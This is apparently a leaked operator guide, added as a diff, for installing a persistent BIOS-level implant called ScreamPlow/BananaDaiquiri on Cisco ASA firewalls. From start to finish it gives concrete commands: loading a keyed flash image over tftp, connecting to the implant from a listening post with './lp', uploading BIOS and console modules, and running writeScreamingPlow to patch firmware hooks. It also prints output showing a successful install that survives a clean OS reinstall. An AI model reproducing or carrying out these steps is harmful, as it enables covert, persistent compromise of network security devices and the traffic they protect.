@@ -1,0 +1,162 @@
+################## ScreamPlow 2.3 / BannanaDaiquiri 3.0.5.1 ###################
+
+# SCP 2.3 / BD 3.0.5.1 capabilities:
+#	Good for BG3001 connections for OS versions up to 8.0.5
+#	PDB good for up to 8.2(x) and 8.3(x)
+
+# Copy the binaries from \Software\BANANADAIQUIRI\3.0.5.1\Binaries to 
+# a /Release directory _somewhere_
+
+# Create a Keyed Flash image for the OS version you will be exploiting.  You will need
+# to have the key available, it does not create a key.  Currently, the config_implant
+# doesn't seem to work everywhere, it might be best to use the automatic build script 
+# and port both the image and they key over
+
+
+
+# You will need to take the keyed Flash Image, the keyed SP UA and the keyed PBD_config.bin to the operation with you
+
+# Practice procedure in the lab
+# Console to a firewall, use FIREWALL_HOWTO to get an ASA FIREWALL
+
+# Copy the new flash image up. Either run a tftp or https server on your local station
+
+show boot
+copy tftp://[workstation IP]/image.bin flash:/image.bin
+
+####!!!!!!! for robomart ops only !!!!!!!################################
+copy tftp://[workstation IP]/image.bin flash:/image2.bin		#
+boot system image2.bin							#
+rel									#
+									#
+#after installing SCP reset the boot variable				#
+no boot system image2.bin						#
+rel									#
+####!!!!!!! for robomart ops only !!!!!!!################################
+
+
+
+# Confirm overwrite
+# issue command to find the IP you need to lp to, taking note of the OUTSIDE IP
+sh ip addr
+# Issue 'rel' to reload the firewall
+
+# After it comes back up, try to connect with the lp from the BG3000/Install/LP directory
+./lp --lp [workstation ip] --implant [Outside address] --idkey [<project>_<ip>.key] --sport 3299 --dport 500
+
+# When you connect, the implant version should be 3.0.0. Note, you might have to try twice to get connected
+# Also, remember you need the OUTSIDE address of the Firewall, not the console IP
+
+# UPLOAD and activate the bios module, in BG3000, there is only one module for all BIOS chips
+31
+biosModule_ASABIOS
+32 1010a
+
+# UPLOAD and activate the console module, we need to verify the CHIPSET with 'show module'
+31
+Console
+32 60101
+
+# use the Console to issue the 'show module' command you will get something like this
+Mod Card Type                                    Model              Serial No. 
+--- -------------------------------------------- ------------------ -----------
+  0 ASA 5520 Adaptive Security Appliance         ASA5520            JMX0952K0GY
+  1 ASA 5500 Series Security Services Module-10  ASA-SSM-10         JAB0950007Q
+
+Mod MAC Address Range                 Hw Version   Fw Version   Sw Version     
+--- --------------------------------- ------------ ------------ ---------------
+  0 0013.c480.d2d0 to 0013.c480.d2d4  1.0          1.0(10)0     7.0(8)
+  1 0013.c482.4d01 to 0013.c482.4d01  1.0          1.0(10)0     5.0(2)S152.0
+
+Mod Status             Data Plane Status
+--- ------------------ ---------------------
+  0 Up Sys             Not Applicable         
+  1 Up                 Up                     
+
+# Here notice the model is ASA5520, and the Fw Version is 1.0(10)0, it is this last number that you want
+# Exit the console and remove the module
+33 60101 34 60101 36
+
+# Make sure the biosModule_ASABIOS is uploaded and activated 
+# Exit the LP and cd to the SCP directory
+
+# Make a screamplow directory
+
+mkdir ../screamplow
+
+# We need to link in all of the SCP directory, with only one change for our keyed version of the UserArea
+cd ../screamplow
+ln -s ../SCP/* .
+rm -f SCREAM_UA_full_support.bin
+rm -f PBD_config.bin
+ln -s ../SCP/[<Project>_<IP>_SCREAM_UA_full_support.sp] SCREAM_UA_full_support.bin
+ln -s ../SCP/[PBD_config_<Project>_<IP>_<beacon option>.bin] PBD_config.bin
+
+# Run writeScreamingPlow-3020 in the LP directory
+cd ../SCP
+./writeScreamingPlow-3020 --lp [workstation ip] --implant [Outside address] --idkey [<project>_<ip>.key] --sport 3299 --dport 500 --readCmd 18 --writeCmd 19 --operation INSTALL --platform ASAGEN --bios [bios_ver] --dir ../screamplow
+
+File Information
+----------------
+First Hook to Baseline:  ../screamplow//asaGen_cleanE64CA.bin   Addr: 0xffee64ca
+First Hook to Write:     ../screamplow//asaGen_patchE64CA.bin   Addr: 0xffee64ca
+
+Second Hook to Baseline: ../screamplow//asaGen_cleanE65C9.bin   Addr: 0xffee65c9
+Second Hook to Write:    ../screamplow//asaGen_patchE65C9.bin   Addr: 0xffee65c9
+
+Second BG to Baseline:   ../screamplow//asaGen_clean30000.bin   Addr: 0xffe30000
+Second BG to Write:      ../screamplow//SCREAM_UA_full_support.bin      Addr: 0xffe30000
+
+First Code to Baseline:  ../screamplow//asaGen_clean20000_biosVer100or112.bin   Addr: 0xffe20000
+First Code to Write:     ../screamplow//asaGen_patch20000_biosVer100or112.bin   Addr: 0xffe20000
+
+First BG to baseline:    The previous check will ensure this area is as expected.
+First BG to Write:       ../screamplow//asaGen_patch22000_biosVer100or112.bin   Addr: 0xffe22000
+
+Trampoline to Baseline:  ../screamplow//asaGen_cleanEF000.bin   Addr: 0xffeef000
+Trampoline to Write:     ../screamplow//asaGen_patchEF000_biosVer100or112.bin   Addr: 0xffeef000
+
+Do you wish to proceed? (Answer yes or no): yes
+Connection Established to Implant 7a08bec8
+              OS Version     : 10070800
+              Implant Version: 3.0.0
+              Session Timeout: 5 (minutes)
+              Hello Timeout  : 1 (minutes)
+              BENIGNSIZE     : 512 (bytes)
+              Uptime         : 879 (seconds) [0 (days)]
+Response: 0x00000001
+Request : 0x00000000
+Received a valid response type [COMM_BIOS_READ_RESPONSE] received for [COMM_BIOS_READ_REQUEST] sent
+        The buffer is located at 0x0361b530 and contains 0x00010000 bytes.
+tempChecksum: 0x00ff0000
+sentChecksum: 0x00ff0000
+
+...
+
+Second Writing Hook File (SHA1): 55922d14d2307dd7cbcf5ba2de059363c8ebf93a
+Second Writing Hook Box  (SHA1): 55922d14d2307dd7cbcf5ba2de059363c8ebf93a
+
+Finished testing.
+
+
+SCREAMINGPLOW Installation Operation - Successful.
+
+# That last part lets you know it worked. To test, you need to upload a clean IOS version the box. Try the same
+# IOS version or perhaps a different one just if you are curious, back on the console
+
+copy tftp://11.10.10.10/clean.bin flash:/image.bin
+rel
+
+# When the Firewall comes back up, if it is a 7 series, you must wait until check heaps runs, use show checkheaps, once it brings
+# back some values you are good to go, on 8 series, there is no real wait, just wait for a prompt after reload.
+
+./lp --lp [workstation ip] --implant [Outside address] --idkey [<project>_<ip>.key] --sport 3299 --dport 500
+Connection Established to Implant 7a08bec8
+              OS Version     : 10070800
+              Implant Version: 3.0.0
+              Session Timeout: 4 (minutes)
+              Hello Timeout  : 1 (minutes)
+              BENIGNSIZE     : 512 (bytes)
+              Uptime         : 121 (seconds) [0 (days)]
+# Fin
+
